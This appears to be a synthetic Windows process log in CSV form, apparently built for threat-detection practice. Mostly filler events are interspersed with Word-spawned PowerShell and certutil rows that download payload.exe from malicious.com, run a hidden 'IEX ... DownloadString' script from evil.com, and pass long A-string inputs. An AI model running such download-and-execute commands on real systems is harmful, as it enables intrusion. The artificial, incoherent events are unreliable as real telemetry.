timestamp,process,parent_process,command_line,ip,destination_port,user_agent
2026-03-30 18:11:57,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.78,0,chrome
2026-03-30 18:11:58,chrome.exe,explorer.exe,notepad file.txt,192.168.1.74,0,chrome
2026-03-30 18:11:59,explorer.exe,explorer.exe,cmd dir,192.168.1.115,0,chrome
2026-03-30 18:12:00,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.138,0,chrome
2026-03-30 18:12:01,cmd.exe,explorer.exe,cmd dir,192.168.1.72,0,chrome
2026-03-30 18:12:02,explorer.exe,explorer.exe,explorer open folder,192.168.1.201,0,chrome
2026-03-30 18:12:03,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.37,0,chrome
2026-03-30 18:12:04,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.208,0,chrome
2026-03-30 18:12:05,cmd.exe,explorer.exe,explorer open folder,192.168.1.219,0,chrome
2026-03-30 18:12:06,chrome.exe,explorer.exe,notepad file.txt,192.168.1.85,0,chrome
2026-03-30 18:12:07,chrome.exe,explorer.exe,cmd dir,192.168.1.170,0,chrome
2026-03-30 18:12:08,chrome.exe,explorer.exe,notepad file.txt,192.168.1.216,0,chrome
2026-03-30 18:12:09,chrome.exe,explorer.exe,explorer open folder,192.168.1.159,0,chrome
2026-03-30 18:12:10,notepad.exe,explorer.exe,cmd dir,192.168.1.46,0,chrome
2026-03-30 18:12:11,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.19,0,chrome
2026-03-30 18:12:12,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.233,0,chrome
2026-03-30 18:12:13,chrome.exe,explorer.exe,notepad file.txt,192.168.1.142,0,chrome
2026-03-30 18:12:14,cmd.exe,explorer.exe,cmd dir,192.168.1.57,0,chrome
2026-03-30 18:12:15,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.15,0,chrome
2026-03-30 18:12:16,notepad.exe,explorer.exe,notepad file.txt,192.168.1.97,0,chrome
2026-03-30 18:12:17,explorer.exe,explorer.exe,explorer open folder,192.168.1.169,0,chrome
2026-03-30 18:12:18,explorer.exe,explorer.exe,explorer open folder,192.168.1.241,0,chrome
2026-03-30 18:12:19,chrome.exe,explorer.exe,notepad file.txt,192.168.1.250,0,chrome
2026-03-30 18:12:20,notepad.exe,explorer.exe,explorer open folder,192.168.1.128,0,chrome
2026-03-30 18:12:21,explorer.exe,explorer.exe,notepad file.txt,192.168.1.73,0,chrome
2026-03-30 18:12:22,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.57,0,chrome
2026-03-30 18:12:23,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.152,0,chrome
2026-03-30 18:12:24,cmd.exe,explorer.exe,cmd dir,192.168.1.39,0,chrome
2026-03-30 18:12:25,cmd.exe,explorer.exe,cmd dir,192.168.1.68,0,chrome
2026-03-30 18:12:26,cmd.exe,explorer.exe,cmd dir,192.168.1.240,0,chrome
2026-03-30 18:12:27,notepad.exe,explorer.exe,cmd dir,192.168.1.226,0,chrome
2026-03-30 18:12:28,notepad.exe,explorer.exe,cmd dir,192.168.1.79,0,chrome
2026-03-30 18:12:29,chrome.exe,explorer.exe,explorer open folder,192.168.1.13,0,chrome
2026-03-30 18:12:30,cmd.exe,explorer.exe,notepad file.txt,192.168.1.155,0,chrome
2026-03-30 18:12:31,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.201,0,chrome
2026-03-30 18:12:32,explorer.exe,explorer.exe,notepad file.txt,192.168.1.230,0,chrome
2026-03-30 18:12:33,cmd.exe,explorer.exe,explorer open folder,192.168.1.75,0,chrome
2026-03-30 18:12:34,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.197,0,chrome
2026-03-30 18:12:35,cmd.exe,explorer.exe,notepad file.txt,192.168.1.251,0,chrome
2026-03-30 18:12:36,notepad.exe,explorer.exe,notepad file.txt,192.168.1.143,0,chrome
2026-03-30 18:12:37,explorer.exe,explorer.exe,cmd dir,192.168.1.4,0,chrome
2026-03-30 18:12:38,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.25,0,chrome
2026-03-30 18:12:39,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.46,0,chrome
2026-03-30 18:12:40,cmd.exe,explorer.exe,notepad file.txt,192.168.1.186,0,chrome
2026-03-30 18:12:41,cmd.exe,explorer.exe,explorer open folder,192.168.1.42,0,chrome
2026-03-30 18:12:42,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.255,0,chrome
2026-03-30 18:12:43,chrome.exe,explorer.exe,explorer open folder,192.168.1.110,0,chrome
2026-03-30 18:12:44,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.89,0,chrome
2026-03-30 18:12:45,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,8.8.8.8,443,python-requests
2026-03-30 18:12:46,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,1.1.1.1,443,curl
2026-03-30 18:12:47,powershell.exe,winword.exe,powershell -enc aW52b2tl,23.45.67.89,443,curl
2026-03-30 18:12:48,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,23.45.67.89,80,curl
2026-03-30 18:12:49,powershell.exe,winword.exe,cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1'),8.8.8.8,4444,python-requests
2026-03-30 18:12:50,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,1.1.1.1,80,winhttp
2026-03-30 18:12:51,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,8.8.8.8,80,winhttp
2026-03-30 18:12:52,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,80,winhttp
2026-03-30 18:12:53,notepad.exe,explorer.exe,notepad file.txt,192.168.1.227,0,chrome
2026-03-30 18:12:54,notepad.exe,explorer.exe,notepad file.txt,192.168.1.224,0,chrome
2026-03-30 18:12:55,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.91,0,chrome
2026-03-30 18:12:56,cmd.exe,explorer.exe,explorer open folder,192.168.1.209,0,chrome
2026-03-30 18:12:57,explorer.exe,explorer.exe,explorer open folder,192.168.1.75,0,chrome
2026-03-30 18:12:58,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.120,0,chrome
2026-03-30 18:12:59,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.135,0,chrome
2026-03-30 18:13:00,cmd.exe,explorer.exe,cmd dir,192.168.1.155,0,chrome
2026-03-30 18:13:01,explorer.exe,explorer.exe,cmd dir,192.168.1.201,0,chrome
2026-03-30 18:13:02,chrome.exe,explorer.exe,cmd dir,192.168.1.62,0,chrome
2026-03-30 18:13:03,chrome.exe,explorer.exe,notepad file.txt,192.168.1.248,0,chrome
2026-03-30 18:13:04,explorer.exe,explorer.exe,explorer open folder,192.168.1.22,0,chrome
2026-03-30 18:13:05,explorer.exe,explorer.exe,cmd dir,192.168.1.175,0,chrome
2026-03-30 18:13:06,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.4,0,chrome
2026-03-30 18:13:07,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.57,0,chrome
2026-03-30 18:13:08,explorer.exe,explorer.exe,cmd dir,192.168.1.100,0,chrome
2026-03-30 18:13:09,notepad.exe,explorer.exe,cmd dir,192.168.1.142,0,chrome
2026-03-30 18:13:10,notepad.exe,explorer.exe,notepad file.txt,192.168.1.30,0,chrome
2026-03-30 18:13:11,explorer.exe,explorer.exe,notepad file.txt,192.168.1.184,0,chrome
2026-03-30 18:13:12,chrome.exe,explorer.exe,notepad file.txt,192.168.1.86,0,chrome
2026-03-30 18:13:13,cmd.exe,explorer.exe,notepad file.txt,192.168.1.155,0,chrome
2026-03-30 18:13:14,notepad.exe,explorer.exe,cmd dir,192.168.1.76,0,chrome
2026-03-30 18:13:15,chrome.exe,explorer.exe,explorer open folder,192.168.1.169,0,chrome
2026-03-30 18:13:16,notepad.exe,explorer.exe,cmd dir,192.168.1.95,0,chrome
2026-03-30 18:13:17,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.125,0,chrome
2026-03-30 18:13:18,chrome.exe,explorer.exe,notepad file.txt,192.168.1.137,0,chrome
2026-03-30 18:13:19,cmd.exe,explorer.exe,notepad file.txt,192.168.1.32,0,chrome
2026-03-30 18:13:20,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.244,0,chrome
2026-03-30 18:13:21,notepad.exe,explorer.exe,cmd dir,192.168.1.113,0,chrome
2026-03-30 18:13:22,explorer.exe,explorer.exe,explorer open folder,192.168.1.122,0,chrome
2026-03-30 18:13:23,explorer.exe,explorer.exe,explorer open folder,192.168.1.128,0,chrome
2026-03-30 18:13:24,notepad.exe,explorer.exe,notepad file.txt,192.168.1.144,0,chrome
2026-03-30 18:13:25,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.223,0,chrome
2026-03-30 18:13:26,chrome.exe,explorer.exe,cmd dir,192.168.1.152,0,chrome
2026-03-30 18:13:27,chrome.exe,explorer.exe,cmd dir,192.168.1.144,0,chrome
2026-03-30 18:13:28,cmd.exe,explorer.exe,explorer open folder,192.168.1.150,0,chrome
2026-03-30 18:13:29,cmd.exe,explorer.exe,explorer open folder,192.168.1.175,0,chrome
2026-03-30 18:13:30,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.25,0,chrome
2026-03-30 18:13:31,notepad.exe,explorer.exe,notepad file.txt,192.168.1.29,0,chrome
2026-03-30 18:13:32,chrome.exe,explorer.exe,notepad file.txt,192.168.1.110,0,chrome
2026-03-30 18:13:33,explorer.exe,explorer.exe,cmd dir,192.168.1.123,0,chrome
2026-03-30 18:13:34,cmd.exe,explorer.exe,explorer open folder,192.168.1.139,0,chrome
2026-03-30 18:13:35,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.74,0,chrome
2026-03-30 18:13:36,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.28,0,chrome
2026-03-30 18:13:37,explorer.exe,explorer.exe,cmd dir,192.168.1.11,0,chrome
2026-03-30 18:13:38,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.8,0,chrome
2026-03-30 18:13:39,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.250,0,chrome
2026-03-30 18:13:40,chrome.exe,explorer.exe,cmd dir,192.168.1.132,0,chrome
2026-03-30 18:13:41,chrome.exe,explorer.exe,cmd dir,192.168.1.233,0,chrome
2026-03-30 18:13:42,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.167,0,chrome
2026-03-30 18:13:43,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.86,0,chrome
2026-03-30 18:13:44,cmd.exe,explorer.exe,explorer open folder,192.168.1.215,0,chrome
2026-03-30 18:13:45,weird.exe,cmd.exe,weird.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,45.33.32.156,8080,curl
2026-03-30 18:13:46,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.99,0,chrome
2026-03-30 18:13:47,chrome.exe,explorer.exe,notepad file.txt,192.168.1.61,0,chrome
2026-03-30 18:13:48,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.85,0,chrome
2026-03-30 18:13:49,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.245,0,chrome
2026-03-30 18:13:50,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.115,0,chrome
2026-03-30 18:13:51,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.139,0,chrome
2026-03-30 18:13:52,notepad.exe,explorer.exe,notepad file.txt,192.168.1.63,0,chrome
2026-03-30 18:13:53,chrome.exe,explorer.exe,cmd dir,192.168.1.121,0,chrome
2026-03-30 18:13:54,notepad.exe,explorer.exe,notepad file.txt,192.168.1.44,0,chrome
2026-03-30 18:13:55,cmd.exe,explorer.exe,cmd dir,192.168.1.111,0,chrome
2026-03-30 18:13:56,cmd.exe,explorer.exe,cmd dir,192.168.1.228,0,chrome
2026-03-30 18:13:57,chrome.exe,explorer.exe,cmd dir,192.168.1.37,0,chrome
2026-03-30 18:13:58,explorer.exe,explorer.exe,notepad file.txt,192.168.1.154,0,chrome
2026-03-30 18:13:59,cmd.exe,explorer.exe,explorer open folder,192.168.1.2,0,chrome
2026-03-30 18:14:00,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.226,0,chrome
2026-03-30 18:14:01,chrome.exe,explorer.exe,cmd dir,192.168.1.31,0,chrome
2026-03-30 18:14:02,cmd.exe,explorer.exe,explorer open folder,192.168.1.162,0,chrome
2026-03-30 18:14:03,cmd.exe,explorer.exe,cmd dir,192.168.1.93,0,chrome
2026-03-30 18:14:04,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.98,0,chrome
2026-03-30 18:14:05,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.67,0,chrome
2026-03-30 18:14:06,explorer.exe,explorer.exe,cmd dir,192.168.1.46,0,chrome
2026-03-30 18:14:07,chrome.exe,explorer.exe,cmd dir,192.168.1.216,0,chrome
2026-03-30 18:14:08,chrome.exe,explorer.exe,notepad file.txt,192.168.1.42,0,chrome
2026-03-30 18:14:09,explorer.exe,explorer.exe,explorer open folder,192.168.1.104,0,chrome
2026-03-30 18:14:10,chrome.exe,explorer.exe,explorer open folder,192.168.1.106,0,chrome
2026-03-30 18:14:11,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.73,0,chrome
2026-03-30 18:14:12,notepad.exe,explorer.exe,explorer open folder,192.168.1.22,0,chrome
2026-03-30 18:14:13,notepad.exe,explorer.exe,cmd dir,192.168.1.24,0,chrome
2026-03-30 18:14:14,notepad.exe,explorer.exe,cmd dir,192.168.1.57,0,chrome
2026-03-30 18:14:15,chrome.exe,explorer.exe,cmd dir,192.168.1.107,0,chrome
2026-03-30 18:14:16,chrome.exe,explorer.exe,explorer open folder,192.168.1.137,0,chrome
2026-03-30 18:14:17,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.212,0,chrome
2026-03-30 18:14:18,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.142,0,chrome
2026-03-30 18:14:19,explorer.exe,explorer.exe,explorer open folder,192.168.1.212,0,chrome
2026-03-30 18:14:20,explorer.exe,explorer.exe,notepad file.txt,192.168.1.165,0,chrome
2026-03-30 18:14:21,notepad.exe,explorer.exe,cmd dir,192.168.1.16,0,chrome
2026-03-30 18:14:22,cmd.exe,explorer.exe,cmd dir,192.168.1.88,0,chrome
2026-03-30 18:14:23,cmd.exe,explorer.exe,cmd dir,192.168.1.131,0,chrome
2026-03-30 18:14:24,chrome.exe,explorer.exe,explorer open folder,192.168.1.219,0,chrome
2026-03-30 18:14:25,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,80,curl
2026-03-30 18:14:26,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,443,curl
2026-03-30 18:14:27,powershell.exe,winword.exe,cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1'),1.1.1.1,80,python-requests
2026-03-30 18:14:28,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,23.45.67.89,80,python-requests
2026-03-30 18:14:29,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,8.8.8.8,443,python-requests
2026-03-30 18:14:30,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,80,winhttp
2026-03-30 18:14:31,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,80,winhttp
2026-03-30 18:14:32,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,1.1.1.1,80,winhttp
2026-03-30 18:14:33,chrome.exe,explorer.exe,explorer open folder,192.168.1.15,0,chrome
2026-03-30 18:14:34,chrome.exe,explorer.exe,notepad file.txt,192.168.1.201,0,chrome
2026-03-30 18:14:35,chrome.exe,explorer.exe,notepad file.txt,192.168.1.250,0,chrome
2026-03-30 18:14:36,cmd.exe,explorer.exe,cmd dir,192.168.1.222,0,chrome
2026-03-30 18:14:37,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.15,0,chrome
2026-03-30 18:14:38,explorer.exe,explorer.exe,explorer open folder,192.168.1.185,0,chrome
2026-03-30 18:14:39,notepad.exe,explorer.exe,cmd dir,192.168.1.71,0,chrome
2026-03-30 18:14:40,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.29,0,chrome
2026-03-30 18:14:41,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.204,0,chrome
2026-03-30 18:14:42,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.124,0,chrome
2026-03-30 18:14:43,explorer.exe,explorer.exe,cmd dir,192.168.1.167,0,chrome
2026-03-30 18:14:44,explorer.exe,explorer.exe,notepad file.txt,192.168.1.201,0,chrome
2026-03-30 18:14:45,cmd.exe,explorer.exe,cmd dir,192.168.1.30,0,chrome
2026-03-30 18:14:46,notepad.exe,explorer.exe,explorer open folder,192.168.1.101,0,chrome
2026-03-30 18:14:47,explorer.exe,explorer.exe,explorer open folder,192.168.1.200,0,chrome
2026-03-30 18:14:48,cmd.exe,explorer.exe,explorer open folder,192.168.1.74,0,chrome
2026-03-30 18:14:49,explorer.exe,explorer.exe,cmd dir,192.168.1.124,0,chrome
2026-03-30 18:14:50,explorer.exe,explorer.exe,notepad file.txt,192.168.1.54,0,chrome
2026-03-30 18:14:51,explorer.exe,explorer.exe,explorer open folder,192.168.1.54,0,chrome
2026-03-30 18:14:52,notepad.exe,explorer.exe,cmd dir,192.168.1.133,0,chrome
2026-03-30 18:14:53,cmd.exe,explorer.exe,explorer open folder,192.168.1.17,0,chrome
2026-03-30 18:14:54,chrome.exe,explorer.exe,explorer open folder,192.168.1.99,0,chrome
2026-03-30 18:14:55,cmd.exe,explorer.exe,notepad file.txt,192.168.1.158,0,chrome
2026-03-30 18:14:56,chrome.exe,explorer.exe,cmd dir,192.168.1.131,0,chrome
2026-03-30 18:14:57,notepad.exe,explorer.exe,cmd dir,192.168.1.110,0,chrome
2026-03-30 18:14:58,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.123,0,chrome
2026-03-30 18:14:59,explorer.exe,explorer.exe,notepad file.txt,192.168.1.98,0,chrome
2026-03-30 18:15:00,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.200,0,chrome
2026-03-30 18:15:01,chrome.exe,explorer.exe,notepad file.txt,192.168.1.100,0,chrome
2026-03-30 18:15:02,notepad.exe,explorer.exe,explorer open folder,192.168.1.167,0,chrome
2026-03-30 18:15:03,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.44,0,chrome
2026-03-30 18:15:04,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.248,0,chrome
2026-03-30 18:15:05,chrome.exe,explorer.exe,notepad file.txt,192.168.1.103,0,chrome
2026-03-30 18:15:06,notepad.exe,explorer.exe,cmd dir,192.168.1.111,0,chrome
2026-03-30 18:15:07,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.196,0,chrome
2026-03-30 18:15:08,explorer.exe,explorer.exe,explorer open folder,192.168.1.114,0,chrome
2026-03-30 18:15:09,cmd.exe,explorer.exe,cmd dir,192.168.1.151,0,chrome
2026-03-30 18:15:10,cmd.exe,explorer.exe,cmd dir,192.168.1.153,0,chrome
2026-03-30 18:15:11,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.112,0,chrome
2026-03-30 18:15:12,explorer.exe,explorer.exe,explorer open folder,192.168.1.14,0,chrome
2026-03-30 18:15:13,chrome.exe,explorer.exe,explorer open folder,192.168.1.140,0,chrome
2026-03-30 18:15:14,explorer.exe,explorer.exe,notepad file.txt,192.168.1.192,0,chrome
2026-03-30 18:15:15,unknown_330.exe,cmd.exe,random suspicious execution,1.1.1.1,9999,unknown
2026-03-30 18:15:16,chrome.exe,explorer.exe,cmd dir,192.168.1.169,0,chrome
2026-03-30 18:15:17,chrome.exe,explorer.exe,explorer open folder,192.168.1.25,0,chrome
2026-03-30 18:15:18,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.133,0,chrome
2026-03-30 18:15:19,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.8,0,chrome
2026-03-30 18:15:20,notepad.exe,explorer.exe,notepad file.txt,192.168.1.223,0,chrome
2026-03-30 18:15:21,cmd.exe,explorer.exe,explorer open folder,192.168.1.210,0,chrome
2026-03-30 18:15:22,explorer.exe,explorer.exe,cmd dir,192.168.1.26,0,chrome
2026-03-30 18:15:23,cmd.exe,explorer.exe,explorer open folder,192.168.1.252,0,chrome
2026-03-30 18:15:24,cmd.exe,explorer.exe,explorer open folder,192.168.1.26,0,chrome
2026-03-30 18:15:25,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.69,0,chrome
2026-03-30 18:15:26,notepad.exe,explorer.exe,explorer open folder,192.168.1.87,0,chrome
2026-03-30 18:15:27,explorer.exe,explorer.exe,notepad file.txt,192.168.1.174,0,chrome
2026-03-30 18:15:28,explorer.exe,explorer.exe,cmd dir,192.168.1.185,0,chrome
2026-03-30 18:15:29,cmd.exe,explorer.exe,explorer open folder,192.168.1.154,0,chrome
2026-03-30 18:15:30,cmd.exe,explorer.exe,notepad file.txt,192.168.1.18,0,chrome
2026-03-30 18:15:31,chrome.exe,explorer.exe,notepad file.txt,192.168.1.109,0,chrome
2026-03-30 18:15:32,cmd.exe,explorer.exe,notepad file.txt,192.168.1.166,0,chrome
2026-03-30 18:15:33,chrome.exe,explorer.exe,explorer open folder,192.168.1.111,0,chrome
2026-03-30 18:15:34,explorer.exe,explorer.exe,notepad file.txt,192.168.1.128,0,chrome
2026-03-30 18:15:35,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.191,0,chrome
2026-03-30 18:15:36,cmd.exe,explorer.exe,explorer open folder,192.168.1.19,0,chrome
2026-03-30 18:15:37,chrome.exe,explorer.exe,cmd dir,192.168.1.6,0,chrome
2026-03-30 18:15:38,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.242,0,chrome
2026-03-30 18:15:39,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.13,0,chrome
2026-03-30 18:15:40,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.226,0,chrome
2026-03-30 18:15:41,chrome.exe,explorer.exe,notepad file.txt,192.168.1.13,0,chrome
2026-03-30 18:15:42,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.51,0,chrome
2026-03-30 18:15:43,chrome.exe,explorer.exe,notepad file.txt,192.168.1.141,0,chrome
2026-03-30 18:15:44,chrome.exe,explorer.exe,notepad file.txt,192.168.1.126,0,chrome
2026-03-30 18:15:45,weird.exe,cmd.exe,weird.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,45.33.32.156,8080,curl
2026-03-30 18:15:46,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.142,0,chrome
2026-03-30 18:15:47,notepad.exe,explorer.exe,explorer open folder,192.168.1.237,0,chrome
2026-03-30 18:15:48,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.223,0,chrome
2026-03-30 18:15:49,explorer.exe,explorer.exe,cmd dir,192.168.1.142,0,chrome
2026-03-30 18:15:50,explorer.exe,explorer.exe,explorer open folder,192.168.1.162,0,chrome
2026-03-30 18:15:51,cmd.exe,explorer.exe,cmd dir,192.168.1.227,0,chrome
2026-03-30 18:15:52,explorer.exe,explorer.exe,cmd dir,192.168.1.46,0,chrome
2026-03-30 18:15:53,chrome.exe,explorer.exe,cmd dir,192.168.1.135,0,chrome
2026-03-30 18:15:54,cmd.exe,explorer.exe,explorer open folder,192.168.1.94,0,chrome
2026-03-30 18:15:55,notepad.exe,explorer.exe,notepad file.txt,192.168.1.70,0,chrome
2026-03-30 18:15:56,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.127,0,chrome
2026-03-30 18:15:57,chrome.exe,explorer.exe,notepad file.txt,192.168.1.26,0,chrome
2026-03-30 18:15:58,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.178,0,chrome
2026-03-30 18:15:59,cmd.exe,explorer.exe,cmd dir,192.168.1.96,0,chrome
2026-03-30 18:16:00,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.213,0,chrome
2026-03-30 18:16:01,notepad.exe,explorer.exe,explorer open folder,192.168.1.148,0,chrome
2026-03-30 18:16:02,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.95,0,chrome
2026-03-30 18:16:03,explorer.exe,explorer.exe,notepad file.txt,192.168.1.201,0,chrome
2026-03-30 18:16:04,explorer.exe,explorer.exe,explorer open folder,192.168.1.94,0,chrome
2026-03-30 18:16:05,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,8.8.8.8,443,python-requests
2026-03-30 18:16:06,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,443,python-requests
2026-03-30 18:16:07,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,80,python-requests
2026-03-30 18:16:08,powershell.exe,winword.exe,cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1'),1.1.1.1,80,python-requests
2026-03-30 18:16:09,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,8.8.8.8,4444,curl
